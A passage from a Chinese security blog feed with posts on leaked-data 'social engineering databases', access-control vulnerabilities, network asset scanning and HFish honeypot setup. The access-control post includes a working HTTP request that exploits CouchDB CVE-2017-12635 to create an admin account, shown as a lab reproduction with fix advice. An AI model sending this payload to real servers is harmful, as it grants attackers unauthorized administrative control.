    <content type="html"><![CDATA[<p>“社工库”是运用社会工程学进行渗透测试时候积累的各方面数据的结构化数据库。<br><a id="more"></a></p><h4 id="0×01前言"><a href="#0×01前言" class="headerlink" title="0×01前言"></a>0×01前言</h4><blockquote><p>15岁仅凭借一台电脑和一部老式的调制解调器黑进北美防空司令部的大佬，他的传奇生涯被翻拍成电影，《骇客追缉令》、《战争游戏》和《自由停工期》三部黑客电影的原型都是他，甚至连主角的名字都没换</p></blockquote><p><img src="http://qiniu.austfish.cn/blog/20200326/MRndseNzc1Ky.png?imageslim" alt="mark"></p><p>凯文·米特尼克（Kevin David Mitnick），1963年8月6日出生于美国洛杉矶，第一个被美国联邦调查局通缉的黑客。有评论称他为世界上“头号电脑黑客”，其传奇的黑客经历足以令全世界为之震惊。现职业是网络安全咨询师，出版过《反欺骗的艺术》、《反入侵的艺术》、《线上幽灵：世界头号黑客米特尼克自传》。</p><p><strong>「社会工程学」这个概念就是由他提出来的！</strong></p><h4 id="0×02社会工程学"><a href="#0×02社会工程学" class="headerlink" title="0×02社会工程学"></a>0×02社会工程学</h4><p>社会工程学是一种通过对受害者心理弱点、本能反应、好奇心、信任、贪婪等心理陷阱进行诸如欺骗、伤害等危害手段；是一种黑客攻击方法，利用欺骗等手段骗取对方信任，获取机密情报；是一种利用人性脆弱点、贪婪等等的心理表现进行攻击，是防不胜防的。所有社会工程学攻击都建立在使人决断产生认知偏差的基础上，熟练的社会工程师都是擅长进行信息收集的身体力行者。</p><p>有一本书很出名，估计很多人都有听说过，叫做《欺骗的艺术》，其实社会工程学就是米特尼克在这本书中提出的，不过其初始目的是让全球的网民们能够懂得网络安全，提高警惕，防止没必要的个人损失，但是现在真正的应用似乎不是这样的</p><h4 id="0×03社工库"><a href="#0×03社工库" class="headerlink" title="0×03社工库"></a>0×03社工库</h4><p><strong>社工库，就是社会工程学中所利用的数据库。</strong></p><p>上面提到了，社会工程学的一个维度就是信息搜集，比如指定一个手机号，就能获取到这个手机号背后的主人信息，包括姓名、邮箱、身份证、籍贯、社交账号等等信息，这些信息就是社工库。</p><p>这些信息数据，少则几百万，多则上亿，主要来源是各大公司的安全漏洞，导致数据被黑客窃取。社工库是从2011年开始，呈现了爆发式增长，归其原因，这一年有大量的用户数据泄露。这是我得到的信息，2011年就有上亿数据泄露：</p><blockquote><p>2011.03-多玩游戏网-800万-txt.rar<br>2011.03-织梦CMS官网数据库-34万-sql.zip<br>2011.04-766游戏网-12万-sql.rar<br>2011.04-IS语音-969万-txt.zip<br>2011.04-亚马逊中国买家信息-20万.zip<br>2011.04-凡客诚品买家信息-20万-Excel.zip<br>2011.04-当当网买家信息-101万-Excel.zip<br>2011.04-爱拍游戏网-1100万-txt.zip<br>2011.04-猴岛游戏社区-2683万-txt.rar<br>2011.05-上海市银行大额客户-21万-xls.rar<br>2011.05-木蚂蚁-13万-sql.zip<br>2011.07-土木在线-540万-sql.zip<br>2011.10-178游戏网-1000万-txt.rar<br>2011.10-CSDN.NET-600万-sql.rar<br>2011.10-嘟嘟牛-66277-txt.rar<br>2011.11-7k7k小游戏-2000万-txt.rar<br>2011.11-人人网-500万-txt.rar<br>2011.12-天涯社区-4000万-txt.rar<br>2011.12-淘宝买家卖家邮箱-2500万-txt.zip</p></blockquote><p><strong>再到近些年</strong><br><img src="http://qiniu.austfish.cn/blog/20200326/XpK97xDknosK.png?imageslim" alt="mark"><br><img src="http://qiniu.austfish.cn/blog/20200326/CJWTJsRXaAJd.png?imageslim" alt="mark"><br><img src="http://qiniu.austfish.cn/blog/20200326/3rbPHuxN3a3E.png?imageslim" alt="mark"></p><p>该用户贴出了社工库系统使用效果<br><img src="http://qiniu.austfish.cn/blog/20200326/Q586pAHYD7fB.png?imageslim" alt="mark"></p><p>可以这么理解，社工库就是一个黑客们将各个系统泄漏的用户数据整合分析，然后集中存储的一个地方。</p><p>这些用户数据大部分来自以前黑客拖库撞库获得的数据文件，包含的数据类型除了账号密码外，还包含被攻击网站所属不同行业所带来的附加数据。</p><p>黑客可以在社工库里查询个人的账号、密码及其他个人信息，达到快速获取个人信息、及其他非法获利的目的。也是黑客们进行人肉搜索的一种途径。</p><h4 id="0×04数据泄露（微博数据泄露）"><a href="#0×04数据泄露（微博数据泄露）" class="headerlink" title="0×04数据泄露（微博数据泄露）"></a>0×04数据泄露（微博数据泄露）</h4><blockquote><p>3月19日上午，有微博名为“安全_云舒”的用户转发微博时称：“很多人的手机号码泄露了，根据微博账号就能查到手机号……已经有人通过微博泄露查到我的手机号码，来加我微信了。”</p><p>随后，该网友在微博下的留言中进一步表示，他通过技术查询，发现不少人的手机号已被泄露，当中涉及不少微博认证的明星、官员、企业家。“来总的手机号也被泄露了，我昨晚查过。”（“来总”代指微博CEO 王高飞）</p></blockquote><p><img src="http://qiniu.austfish.cn/blog/20200326/7lB1i9JxsESc.png?imageslim" alt="mark"><br>3月4日，有暗网用户发布了一则名为“5.38亿微博用户绑定手机号数据，其中1.72亿有账号基本信息”的交易信息，售价1388美元。其中绑定手机数据包括用户ID和手机号，账号基本信息包括昵称、头像、粉丝数、所在地等。</p><p><img src="http://qiniu.austfish.cn/blog/20200326/QTdtI4RhQbh5.png?imageslim" alt="mark"></p><p><img src="http://qiniu.austfish.cn/blog/20200326/2R7mIvSBc9N2.png?imageslim" alt="mark"></p><p>据工信部官网3月24日消息，3月21日，针对媒体报道的新浪微博因用户查询接口被恶意调用导致App数据泄露问题，工业和信息化部网络安全管理局对新浪微博相关负责人进行了问询约谈。<br><img src="http://qiniu.austfish.cn/blog/20200326/uc0NIBt7kzL9.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;“社工库”是运用社会工程学进行渗透测试时候积累的各方面数据的结构化数据库。&lt;br&gt;
    
    </summary>
    
    
      <category term="社工" scheme="http://austfish.cn/tags/%E7%A4%BE%E5%B7%A5/"/>
    
  </entry>
  
  <entry>
    <title>越权操作漏洞的思考与复现</title>
    <link href="http://austfish.cn/2020/03/19/%E8%B6%8A%E6%9D%83%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://austfish.cn/2020/03/19/越权操作漏洞的思考与复现/</id>
    <published>2020-03-19T06:32:46.000Z</published>
    <updated>2022-02-18T03:34:22.644Z</updated>
    
    <content type="html"><![CDATA[<p>多数WEB应用都具备权限划分和控制，但是如果权限控制功能设计存在缺陷，那么攻击者就可以通过这些缺陷来访问未经授权的功能或数据，这就是我们通常说的越权漏洞。攻击者越权后就可以进行一些操作，例如查看敏感信息、进行一些增删改查的操作等等。</p><a id="more"></a><h2 id="0X01-漏洞简述"><a href="#0X01-漏洞简述" class="headerlink" title="0X01 漏洞简述"></a>0X01 漏洞简述</h2><p><strong>越权，顾名思义，就是超出了权限或权力范围。</strong></p><p>多数WEB应用都具备权限划分和控制，但是如果权限控制功能设计存在缺陷，那么攻击者就可以通过这些缺陷来访问未经授权的功能或数据，这就是我们通常说的越权漏洞。攻击者越权后就可以进行一些操作，例如查看敏感信息、进行一些增删改查的操作等等。</p><p>权限攻击可以分为：</p><ul><li><strong>水平权限攻击</strong></li><li><strong>垂直权限攻击</strong></li></ul><p><strong>水平权限漏洞</strong>是指Web应用程序接收到用户请求时，没有判断数据的所属人，或者在判断数据所属人时是从用户提交的参数中获取了userid，导致攻击者可以自行修改userid修改不属于自己的数据。</p><p><strong>垂直权限漏洞</strong>是指Web应用没有做权限控制，或仅仅在菜单上做了权限控制，导致恶意用户只要猜到了其他页面的URL，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。</p><h2 id="0X02-水平越权漏洞"><a href="#0X02-水平越权漏洞" class="headerlink" title="0X02 水平越权漏洞"></a>0X02 水平越权漏洞</h2><h3 id="Pikaqiu漏洞平台-水平越权"><a href="#Pikaqiu漏洞平台-水平越权" class="headerlink" title="Pikaqiu漏洞平台_水平越权"></a>Pikaqiu漏洞平台_水平越权</h3><h4 id="查看个人信息"><a href="#查看个人信息" class="headerlink" title="查看个人信息"></a>查看个人信息</h4><p>####<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure></p><p><img src="http://qiniu.austfish.cn/blog/20200319/PodUi6n6OGVR.png?imageslim" alt="mark"><br>修改username内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure><p>将Lucy换成lili,查询</p><p><img src="http://qiniu.austfish.cn/blog/20200319/DrhbPgGp8pPw.png?imageslim" alt="mark"></p><p>越权漏洞，在lucy的登陆台下面可以查看到其他人的信息</p><h2 id="0X03-垂直越权漏洞"><a href="#0X03-垂直越权漏洞" class="headerlink" title="0X03 垂直越权漏洞"></a>0X03 垂直越权漏洞</h2><h3 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h3><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。</p><p>这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。影响版本：小于 1.7.0 以及 小于 2.1.1</p><h4 id="测试环境展示"><a href="#测试环境展示" class="headerlink" title="测试环境展示"></a>测试环境展示</h4><p><img src="http://qiniu.austfish.cn/blog/20200317/6AMEqxx14D4f.png?imageslim" alt="mark"></p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>首先发送数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PUT /_users/org.couchdb.user:vulhub HTTP/1.1 </span><br><span class="line">Host: your-ip:5984 Accept: */* </span><br><span class="line">Accept-Language: en </span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) </span><br><span class="line">Connection: close </span><br><span class="line">Content-Type: application/json </span><br><span class="line">Content-Length: 90 </span><br><span class="line"></span><br><span class="line">&#123; </span><br><span class="line">    &quot;type&quot;: &quot;user&quot;, </span><br><span class="line">    &quot;name&quot;: &quot;vulhub&quot;, </span><br><span class="line">    &quot;roles&quot;: [&quot;_admin&quot;], &quot;</span><br><span class="line">    password&quot;: &quot;vulhub&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://qiniu.austfish.cn/blog/20200317/g60HW8eIsLyN.png?imageslim" alt="mark"><br>返回显示：<br>可见只有管理员才有权限操作<br><img src="http://qiniu.austfish.cn/blog/20200317/igtq4Hxiqt9k.png?imageslim" alt="mark"><br><img src="http://qiniu.austfish.cn/blog/20200317/RaJG8FlfArjc.png?imageslim" alt="mark"></p><p>发送两个roles规则的数据包，可以绕过权限限制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /_users/org.couchdb.user:vulhub HTTP/1.1 </span><br><span class="line">Host: your-ip:5984 Accept: */* </span><br><span class="line">Accept-Language: en </span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) </span><br><span class="line">Connection: close </span><br><span class="line">Content-Type: application/json </span><br><span class="line">Content-Length: 108 </span><br><span class="line"></span><br><span class="line">&#123; </span><br><span class="line">&quot;type&quot;: &quot;user&quot;,</span><br><span class="line">&quot;name&quot;: &quot;vulhub&quot;, </span><br><span class="line">&quot;roles&quot;: [&quot;_admin&quot;], </span><br><span class="line">&quot;roles&quot;: [], </span><br><span class="line">&quot;password&quot;: &quot;vulhub&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://qiniu.austfish.cn/blog/20200317/0Td3lkqkHC6G.png?imageslim" alt="mark"></p><p>再次访问<a href="http://your-ip:5984/_utils/，" target="_blank" rel="noopener">http://your-ip:5984/_utils/，</a><br>输入账户密码vulhub，可以成功登录：<br><img src="http://qiniu.austfish.cn/blog/20200317/oY0Yogtu7FQr.png?imageslim" alt="mark"></p><h2 id="0X04-如何检测越权漏洞"><a href="#0X04-如何检测越权漏洞" class="headerlink" title="0X04 如何检测越权漏洞"></a>0X04 如何检测越权漏洞</h2><p>最简单的一种检测方式是，首先是通过<strong>定位鉴权参数</strong>，然后替换为其他账户鉴权参数的方法来发现越权漏洞。</p><h2 id="0X05-修复越权漏洞建议"><a href="#0X05-修复越权漏洞建议" class="headerlink" title="0X05 修复越权漏洞建议"></a>0X05 修复越权漏洞建议</h2><ol><li>前后端同时对用户输入信息进行校验，双重验证机制</li><li>调用功能前验证用户是否有权限调用相关功能</li><li>执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限</li><li>直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理</li><li>永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;多数WEB应用都具备权限划分和控制，但是如果权限控制功能设计存在缺陷，那么攻击者就可以通过这些缺陷来访问未经授权的功能或数据，这就是我们通常说的越权漏洞。攻击者越权后就可以进行一些操作，例如查看敏感信息、进行一些增删改查的操作等等。&lt;/p&gt;
    
    </summary>
    
    
      <category term="记录" scheme="http://austfish.cn/tags/%E8%AE%B0%E5%BD%95/"/>
    
      <category term="漏洞" scheme="http://austfish.cn/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>网络资产探测技术调研</title>
    <link href="http://austfish.cn/2020/03/12/%E7%BD%91%E7%BB%9C%E8%B5%84%E4%BA%A7%E6%8E%A2%E6%B5%8B%E6%8A%80%E6%9C%AF%E8%B0%83%E7%A0%94/"/>
    <id>http://austfish.cn/2020/03/12/网络资产探测技术调研/</id>
    <published>2020-03-12T07:23:58.000Z</published>
    <updated>2022-02-18T03:34:22.626Z</updated>
    
    <content type="html"><![CDATA[<p>网络资产探测是指追踪、掌握网络资产情况的过程,通常包括主机发现、操作系统识别、服务识别等,是实现网络安全管理的重要前提, 在网络安全相关工作中具有广泛的应用价值。</p><a id="more"></a><h2 id="0X01-简述"><a href="#0X01-简述" class="headerlink" title="0X01 简述"></a>0X01 简述</h2><p>网络资产探测是指追踪、掌握网络资产情况的过程,通常包括主机发现、操作系统识别、服务识别等,是实现网络安全管理的重要前提, 在网络安全相关工作中具有广泛的应用价值。</p><h2 id="0X02-作用"><a href="#0X02-作用" class="headerlink" title="0X02 作用"></a>0X02 作用</h2><p> 一方面，从网络资产管理角度，网络资产探测能够为统一软硬件版本、更新升级软件和设备等工作提供信息基础。 通过网络资产探测可以发现旧版本的软件，根据最新的威胁情报准确地启动响应措施，避免其存在的漏洞带来威胁；还可以发现非法资产，为及时分析、处理提供便利，最大限度地降低安全问题带来的损失。</p><p> 网络资产探测不仅为网络安全监控、威胁态势感知提供了系统认知基础，而且在提高入侵检测系统的效率、安全威胁分析等方面也有较多应用。根据掌握的网络资产情况,可以为入侵检测系统去掉不相关的规则、缩小匹配规则库、提高检测效率，也可对告警信息进行过滤，减轻网络安全管理人员的告警分析压力，把更多精力放在处理有效攻击上。同时，面对日益加剧的新型高级持续性(Advanced Persistent Threat) 攻击，大规模网络的安全管理人员可在网络资产探测结果的基础上，综合网络资产、网络拓扑结构、漏洞等信息，基于攻击图技术对可能的高危攻击路径进行评估，根据评估结果采取重点防御和响应措施，从而提高防御的针对性。   </p><p> 另一方面，从安全渗透测试(或攻击)的角度看，网络资产探测也可用于渗透(或攻击)前的信息收集，通过网络资产探测，了解目标网络内主机的操作系统类型、开放端口及其后所运行的应用程序类型和版本信息。掌握目标网络的安全状况，有助于选取高效的渗透(或攻击)方法。</p><h2 id="0X03-新型网络资产探测"><a href="#0X03-新型网络资产探测" class="headerlink" title="0X03 新型网络资产探测"></a>0X03 新型网络资产探测</h2><p>从探测基础数据来源分类：</p><ul><li>主动     </li><li>被动     </li><li>基于搜索引擎<br><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAyMDAzMTIvaDBUWEd0TU9welZZLnBuZw?x-oss-process=image/format,png" alt="mark"><h2 id="0X04-探测方法"><a href="#0X04-探测方法" class="headerlink" title="0X04 探测方法"></a>0X04 探测方法</h2></li></ul><p><strong>主动探测</strong><br>主动探测类方法是指通过主动向目标网络资产发送构造的数据包，并从返回数据包的相关信息(包括各层协议内容、 包重传时间等)中提取目标指纹，与指纹进库中的指纹进行比对，来实现对开放端口、操作系统、服务及应用类型的探测。根据使用的指纹信息类型，主动探测类方法主要分为基于响应协议栈指纹的主动探测 方法和基于单包响应时延统计两类。</p><p><strong>被动探测</strong><br>被动探测方法是指采集目标网络的流量，对流量中应用层HTTP,FTP,SMTP 等协议数据包中的特殊字段banner或IP、TCP三次握手、DHCP等协议数据包的指纹特征进行分析，从而实现对网络资产信息的被动探测。</p><p><strong>基于搜索引擎的非入侵式探测</strong><br> 随着大数据、云计算等新技术的引入，搜索引擎的功能得到了加强和拓展，远超出了传统的网页检索，类型也日趋多样，除了常见的谷歌、百度、Bing等通用搜索引擎之外，还出现了Shodan、Censys及 ZoomEye等网络安全专用的搜索引擎。搜索引擎技术的发展为实现基于搜索引擎的非入侵式网络资产探测提供了基础。<br><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAyMDAzMTIvVVRDVm5vYkNERU9KLnBuZw?x-oss-process=image/format,png" alt="mark"></p><h2 id="0X05-快速探测技术"><a href="#0X05-快速探测技术" class="headerlink" title="0X05 快速探测技术"></a>0X05 快速探测技术</h2><p><strong><em>高速网络扫描技术的三大特点：扫描机制、扫描地址生成、并行化加速。</em></strong></p><p><strong>扫描机制方面</strong>，传统TCP SYN 扫描中，扫描器通常需要建立完整的TCP会话，为完成三次握手过程，CPU需要为其划分专门的数据区，如果探测整个IPv４地址空间，将耗费大量的系统资源。高速网络扫描技术则不完成三次握手，只发送第一个SYN，而后RST取消连接，并对该次探测地址进行Hash，将值保存在缓存中，对方回复的SYNＧACK则由专门的接收模块负责等待接收。这种无状态保持的设计，可能会因网络原因丢失一定比例的数据，从实验结果看，，这个比例仅占２％左右，但极大地减少了状态记录的开销。ZMap使用商用硬件和Gbit级网络速率，能在４５min内完成整个IPv４地址空间的扫描，比传统Nmap最激进的默认条件设置下都快1300倍。类似的工具Masscan使用双端口１０Gbit 级的网卡则仅用３min就能完成全网扫描。</p><p><strong>扫描地址生成方面</strong>，新型高速网络扫描工具使用了基于素数域原根(ZMap)或加密算法(Masscan)的地址生成策略，增加了相邻扫描地址的随机性，减少了扫描对同一IP地址段内目标网络的压力，不仅实现了高效的资源(带宽、计算)利用，而且对扫描行为起到了一定的隐蔽作用。</p><p><strong>并行化加速方面</strong>，ZMap，Masscan以及 Nmap的集群式改进版DNmap均支持多主机分布式扫描。在ZMap的基础上开发的ZippierZMap、对 基于素数域原根的扫描地址生成进行了分片处理，不同分片的扫描地址集合都是迭代生成的互为不相关的子集，利于地址生成策略的并行化执行，同时其结合了黑名单数据结构、数据包传输机制等其他改进，适应了10Gbps环境下更高速的扫描。</p><h2 id="0X06-网络流量分析技术"><a href="#0X06-网络流量分析技术" class="headerlink" title="0X06 网络流量分析技术"></a>0X06 网络流量分析技术</h2><p> 从 TCP/IP体系使用的４层结构看，网络接口层(包括物理层和数据链路层)指纹主要体现了硬件设备间的差别，可用于识别网络资产类别，但只限于在本地局域网内获取和分析； 网络层和传输层的数据可以更加便捷地在广域网络上传播，其参数一般用于操作系统的类型和版本的识别；在不考虑目标网络数据隐私保护的前提下，基于深度包检测技术(DPI)，结合软件版本与操作系统版本的映射关系，对应用层及以上协议中的特征字段或负载数据进行深度分析，可以实现软件版本的检测   </p><p> 根据流量采集深度的不同，用于被动资产发现的网络流量分析工具通常可分为流量管理类和入侵检测类。NetFlow是流量管理类的典型代表，是 Cisco为其设备(交换机和路由器)开发的一款网络流量管理工具。其由一个流量出口、 收集器及二者之间的专线组成，能够有效帮助管理员进行流量镜像、审计等工作。一种基于NetFlow的被动资产探测方法，是通过对采集的流量特征信息加载不同的过滤规则可以实现资产探测。但由于该工具是为流量审计设计的，仅保留了网络流量的一些基础信息，因此其难以进行深入分析，且对于一些非标准端口背后的服务及其版本信息更是无能为力。</p><h2 id="0X07-网络资产指纹识别技术"><a href="#0X07-网络资产指纹识别技术" class="headerlink" title="0X07 网络资产指纹识别技术"></a>0X07 网络资产指纹识别技术</h2><p><strong><em>常见的指纹识别方法主要有常规特征匹配和基于机器学习算法的特征匹配两种。</em></strong></p><p><strong>常规指纹特征匹配</strong><br>常用的操作系统指纹识别特征有：IP头中的总长度(toＧ tallength)、标志(ID)、是否分片(DF)、生存时间(TTL)字段等，TCP头中的可选项，TCP 头部的窗口大小(wsize)、可选项等，以及ICMP、UDP协议指纹、SYN-ACK 包重传时延等。    </p><p>在匹配方法上，除了最基础的精确匹配外，考虑到网络延时、动态配置等现实因素，类似正则表达式的模糊匹配方法也被广泛应用，如目前最新版的 p0fv3指纹库将操作系统指纹分为两类(specified,generic)，增加了用于模糊匹配的g类，在s类无法精确匹配的情况下，为避免直接给出未知的结果，对 mss，wsize，scale等字段均允许使用“∗”进行模糊匹配，进而粗略地给出目标操作系统所属的大类；SinFP中的启发 式匹配机制也是一种分层次的模糊匹配。    </p><p>此外，还有采用了综合加权匹配的方法，如 Nmap的指纹评分表对各响应数据项的指纹识别能力进行了量化评分，在 计算响应同该条指纹的匹配率时，引入各数据项的评分作为加权，从而进一步提高识别的准确率。</p><p><strong>基于机器学习的特征匹配</strong><br>随着数据挖掘技术的发展，国内外很多研究人员将机器学习方法引入到操作系统指纹识别领域，提高了指纹匹配的能力。引入朴素贝叶斯分类器进行操作系统指 纹识别，实现了对未精确匹配指纹的识别，但其结果的准确性受限于样本分布的情况，具有 一 定的不确定性。利用 Nmap指纹库训练的神经网络模型识别操作系统指纹，比Nmap自身识别的准确率要高，但由于需要使用RPC服务识别版本，其适用范围受到限制。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;网络资产探测是指追踪、掌握网络资产情况的过程,通常包括主机发现、操作系统识别、服务识别等,是实现网络安全管理的重要前提, 在网络安全相关工作中具有广泛的应用价值。&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://austfish.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="记录" scheme="http://austfish.cn/tags/%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>HFish蜜罐搭建与测试</title>
    <link href="http://austfish.cn/2020/02/06/HFish%E8%9C%9C%E7%BD%90%E6%90%AD%E5%BB%BA%E4%B8%8E%E6%B5%8B%E8%AF%95/"/>
    <id>http://austfish.cn/2020/02/06/HFish蜜罐搭建与测试/</id>
    <published>2020-02-06T05:35:18.000Z</published>
    <updated>2022-02-18T03:34:20.987Z</updated>
    
    <content type="html"><![CDATA[<p><strong>HFish</strong>是一种基于<strong>Golang</strong>开发的跨平台多功能主动诱导型开源蜜罐框架系统，为企业安全防护所做的精心打造，全程记录黑客攻击手段，实现防护自主化。</p><a id="more"></a><h2 id="HFish蜜罐搭建与测试"><a href="#HFish蜜罐搭建与测试" class="headerlink" title="HFish蜜罐搭建与测试"></a>HFish蜜罐搭建与测试</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAyMDAyMDYvRDVxM21FWEM1N21iLnBuZw?x-oss-process=image/format,png" alt="mark"></p><h2 id="0X01-什么是HFish"><a href="#0X01-什么是HFish" class="headerlink" title="0X01 什么是HFish?"></a>0X01 什么是HFish?</h2><p><strong>HFish</strong>是一种基于<strong>Golang</strong>开发的跨平台多功能主动诱导型开源蜜罐框架系统，为企业安全防护所做的精心打造，全程记录黑客攻击手段，实现防护自主化。</p><ul><li>多功能不仅仅请立即获取iTunes <strong>HTTP(S)</strong>蜜罐，还支持<strong>SSH</strong>，<strong>SFTP</strong>，<strong>Redis</strong>，<strong>Mysql</strong>，<strong>FTP</strong>，<strong>Telnet</strong>，<strong>暗网</strong>等</li><li>性扩展提供<strong>API</strong>接口，使用者可以随意扩展蜜罐模块（<strong>WEB，PC，APP</strong>） </li><li>便捷性使用<strong>Golang+ SQLite</strong>开发，使用者可以在<strong>Win+Mac+ Linux</strong>上快速部署一套蜜罐平台 什么是蜜罐</li></ul><h2 id="0X02-什么是蜜罐"><a href="#0X02-什么是蜜罐" class="headerlink" title="0X02 什么是蜜罐?"></a>0X02 什么是蜜罐?</h2><p><strong>蜜罐技术</strong>本质上的英文一种对攻击方进行<strong>欺骗的技术</strong>，布置通过一些作为诱饵的中主机，网络服务或者信息，诱使攻击方对它们实施攻击，可以从而攻击对行为进行捕获状语从句：分析，了解攻击方所使用的工具与方法，可能会攻击防御和动机，能够让防御方清晰地了解他们所面对的安全威胁，并通过技术和管理手段来增强实际系统的安全防护能力。</p><p>蜜罐好比的英文信息酒店收集系统。蜜罐好像是故意让人攻击的目标，<strong>引诱黑客前来攻击</strong>。所以攻击者入侵后，你就可以知道他是如何得逞的，随时了解针对服务器发动的最新的攻击和突破。还可以通过窃听黑客之间的联系，收集黑客所用的种种工具，并且掌握他们的社交网络。</p><h2 id="0X03-Docker安装"><a href="#0X03-Docker安装" class="headerlink" title="0X03 Docker安装"></a>0X03 Docker安装</h2><p>1.root账户登录，查看内核版本如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>2.把yum包更新到最新</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update</span><br></pre></td></tr></table></figure><p>3.安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br></pre></td></tr></table></figure><p>4.设置yum源（选择其中一个）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum-config-manager --add-repo http://download.docker.com/linux/centos/docker-ce.repo（中央仓库）</span><br><span class="line">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo（阿里仓库）</span><br></pre></td></tr></table></figure><p>5.可以查看所有仓库中所有docker版本，并选择特定版本安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum list docker-ce --showduplicates | sort -r</span><br></pre></td></tr></table></figure><p>6.安装Docker，命令：yum install docker-ce-版本号，我选的是docker-ce-18.03.1.ce，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install docker-ce-18.03.1.ce</span><br></pre></td></tr></table></figure><ol start="7"><li>启动Docker，命令：systemctl start docker，然后加入开机启动，如下</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br><span class="line">systemctl enable  docker</span><br><span class="line">docker version</span><br></pre></td></tr></table></figure><h2 id="0X04-单节点部署"><a href="#0X04-单节点部署" class="headerlink" title="0X04 单节点部署"></a>0X04 单节点部署</h2><p><strong>Docker 下载镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull imdevops/hfish</span><br></pre></td></tr></table></figure><p><strong>单节点部署</strong><br>环境变量API_IP的值为 API 的 IP 地址加端口组成。<br>默认帐号密码均为：<strong>admin</strong>，如需修改可以通过加入<strong>-e USERNAME= -e PASSWORD=</strong> 传入环境变量进行修改。<br>如需做数据持久化存储，可加参数 -v $PWD:/opt 